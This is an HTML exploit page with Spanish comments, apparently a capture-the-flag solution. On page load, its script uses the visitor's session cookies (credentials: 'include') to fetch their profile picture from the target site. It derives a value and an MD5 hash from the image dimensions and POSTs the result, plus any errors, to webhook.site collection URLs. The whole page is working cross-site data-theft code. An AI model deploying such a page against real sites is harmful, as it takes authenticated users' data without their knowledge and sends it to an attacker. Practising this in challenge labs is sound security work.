<!DOCTYPE html>
<html>
<head>
    <title>Verificación</title>
</head>
<body>
    <h2>Procesando...</h2>
    <div id="result"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script>
    // Crear un fetch sin credentials para forzar la sesión actual del navegador
    fetch('https://chl-484b3ba3-69b5-43e2-bdd7-c4dc358b8580-imagen-importante.softwareseguro.com.ar/profile-pic?' + Date.now(), {
        credentials: 'include'  // Esto fuerza a usar las cookies de la sesión actual
    })
    .then(response => response.blob())
    .then(blob => {
        const img = new Image();
        const url = URL.createObjectURL(blob);
        
        img.onload = function() {
            const width = this.naturalWidth;
            const height = this.naturalHeight;
            const nivel = width * height;
            const md5 = CryptoJS.MD5(nivel.toString()).toString();
            
            console.log('✅ Dimensiones:', width + 'x' + height, 'Nivel:', nivel);
            
            document.getElementById('result').innerHTML = `
                <h3>✅ Datos obtenidos</h3>
                <p>Dimensiones: ${width} × ${height} px</p>
                <p>Nivel: ${nivel}</p>
                <p>MD5: ${md5}</p>
            `;
            
            // Enviar a tu webhook
            fetch('https://webhook.site/aee2101a-a419-4a17-9ccb-abeb00cd4e95', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    nivel: nivel,
                    md5: md5,
                    dimensions: `${width}x${height}`,
                    user_id: 'current_session'
                })
            });
            
            URL.revokeObjectURL(url);
        };
        
        img.src = url;
    })
    .catch(error => {
        console.error('Error:', error);
        fetch('https://webhook.site/3756256d-2d52-403a-a548-9f2c5bb83c99', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({error: error.toString()})
        });
    });
    </script>
</body>
</html>
